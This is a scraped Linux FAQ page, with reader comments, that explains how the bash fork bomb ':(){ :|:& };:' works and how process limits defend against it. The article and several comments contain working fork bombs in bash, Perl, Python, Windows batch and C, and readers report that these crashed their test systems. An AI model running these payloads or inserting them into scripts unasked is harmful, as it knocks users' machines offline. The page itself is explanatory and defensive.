@@ -1,0 +1,204 @@
+http://www.cyberciti.biz/faq/understanding-bash-fork-bomb/
+
+
+Understanding Bash fork() bomb ~ :(){ :|:& };:
+
+Q. Can you explain following bash code or bash fork() bomb?
+:(){ :|:& };:
+
+A. This is a bash function. It gets called recursively (recursive function). This is most horrible code for any Unix / Linux box. It is often used by sys admin to test user processes limitations (Linux process limits can be configured via /etc/security/limits.conf and PAM).
+
+Once a successful fork bomb has been activated in a system it may not be possible to resume normal operation without rebooting, as the only solution to a fork bomb is to destroy all instances of it.
+[Warning examples may crash your computer] WARNING! These examples may crash your computer if executed.
+Understanding :(){ :|:& };: fork() bomb code
+
+:() - It is a function name. It accepts no arguments at all. Generally, bash function is defined as follows:
+
+foo(){
+ arg1=$1
+ echo ''
+ #do_something on $arg argument
+}
+
+fork() bomb is defined as follows:
+
+:(){
+ :|:&
+};:
+
+:|: - Next it call itself using programming technique called recursion and pipes the output to another call of the function ':'. The worst part is function get called two times to bomb your system.
+
+& - Puts the function call in the background so child cannot die at all and start eating system resources.
+
+; - Terminate the function definition
+
+: - Call (run) the function aka set the fork() bomb.
+
+Here is more human readable code:
+
+bomb() {
+ bomb | bomb &
+}; bomb
+
+Properly configured Linux / UNIX box should not go down when fork() bomb sets off.
+
+Related: How to: Prevent a fork bomb by limiting user process under Linux.
+
+Update: Check out comment # 5 for more fork bomb examples under Perl, Windows XP and C.
+Want to read Linux tips and tricks, but don't have time to check our blog everyday? Subscribe to our daily email newsletter to make sure you don't miss a single tip/tricks. Subscribe to our weekly newsletter here!
+
+    * Email FAQ to a friend
+    * Printable version
+    * Rss Feed
+    * Last Updated: 02/4/08 
+
+{ 16 comments¡­ read them below or add one }
+
+1 mastrboy 11.26.07 at 9:53 am
+
+    i tested this on a fresh install of CentOS and it totaly crashed :P
+
+    How about a nice ¡°howto¡± for protecting against this attacks?
+2 raj 11.27.07 at 12:01 am
+
+    I second the vote for a nice howto.
+
+    Cheers
+3 queue 11.27.07 at 5:02 pm
+
+    Thirded!
+
+    How to prevent a ¡°fork bomb¡±.
+4 Bharat 11.28.07 at 1:19 am
+
+    Yes How to must be started, for the benefits of the innocent users, as the viruses are spread by entities whose brains are configured differently.
+5 l33t 11.28.07 at 9:09 am
+
+    Perl exmaple:
+
+    perl -e "fork while fork" &
+
+    Python example:
+
+    import os
+      while(1):
+          os.fork()
+
+    Windows XP / Vista bat file example:
+
+    :bomb
+    start %0
+    goto bomb
+
+    UNIX style for Windows:
+
+    %0|%0
+
+    C program example:
+
+    #include
+     int main() {   while(1)      fork();  } 
+
+    Plz note that the fork bomb is a form of denial of service, so don¡¯t run on production or unauthorized system.
+6 Ofloo 11.28.07 at 11:42 am
+
+    An other one is that when you have set a quota for your mailboxes and crontab is generating mail over and over eventually the quota will exceed, after a while the mailq will fill up with 1000¡¯s of mail and the system will crash.
+7 kunal 11.28.07 at 11:52 am
+
+    Hi,
+
+    i run it on my testing server and it start consuming my server process.
+    so one thing is clear from this form bomb that it starting issuing new processes rather than threads.
+
+    how we prevent our sites from such fork attacks
+
+    Thanks in advance
+8 vivek 11.28.07 at 12:56 pm
+
+    kunal,
+
+    Read http://www.cyberciti.biz/tips/linux-limiting-user-process.html
+9 Bash 11.28.07 at 2:27 pm
+
+    I tried this on a virtual instance of SLAX, and it totally killed it.
+10 bort 12.05.07 at 4:21 pm
+
+    perl inline¡­
+
+    perl -e ¡°fork while fork¡± &
+11 ATOzTOA 01.30.08 at 4:15 am
+
+    Sleek code :)
+
+    I tried on FC4. Took only 1 minute as root.
+
+    In WinXP, I waited till 7 minutes. Displayed some errors and all, but was responding. Tried MS Word, Task Manager, nothing could be executed. The machine was useless untill reset.
+12 bradley 03.31.08 at 6:06 pm
+
+    This works very quickly on all windows:
+
+    :bomb
+    %0 | %0
+    goto bomb
+13 Joe 11.13.08 at 11:04 pm
+
+    This works faster on all windows:
+
+    :bomb
+    start %0
+    %0|%0
+    goto bomb
+14 sharfah 11.22.08 at 2:42 pm
+
+    A fork bomb process which can no longer fork exits. The following short Z Shell code will typically get rid of the above fork bomb in about a minute:
+
+    while (sleep 100 &!) do; done
+
+    It keeps trying and will eventually start a new do-nothing process; Each new do-nothing process reduces the number of rampant ¡°fork bomb¡± processes by one, until eventually all of them are eradicated, at which point the do-nothing processes can exit.
+15 stealth 08.29.09 at 9:00 pm
+
+    Use ulimit -u 30 (where 30 it is a max number of process ) to protect yourself from this attack(or config your limits.conf)
+16 Peter 09.28.09 at 3:55 pm
+
+    That would make a VERY geeky tattoo.
+
+    :(){ :|:& };:
+
+Leave a Comment
+
+Name *
+
+E-mail *
+
+You can use these HTML tags and attributes: <a href="" title=""> <abbr title=""> <acronym title=""> <b> <blockquote cite=""> <cite> <code> <del datetime=""> <em> <i> <q cite=""> <strike> <strong>
+
+Notify me of followup comments via e-mail
+
+Tagged as: :(){ :|:& };:, bash fork bomb, fork bomb
+
+Previous post: Linux: Resetting a user¡¯s password
+
+Next post: Bash Shell: Replace a string with another string in all files using sed and perl -pie
+Sign up for our daily email newsletter:
+
+
+       
+
+    *
+    *
+    *
+      [Take nixCraft Site Survey]
+
+    *
+    *
+      Related FAQs
+          o Linux/UNIX: Rules for naming file and directory names
+          o Linux / UNIX: Device files
+          o What is the architecture of Linux?
+          o How To: UNIX Add A User To A Group
+          o Why and How To Customize a UNIX / Linux User Account?
+    *
+      FAQ Topics
+
+?2006-2009 nixCraft. All rights reserved | Privacy Policy | Terms of Service
+Advertise | Questions or Comments | Sitemap 
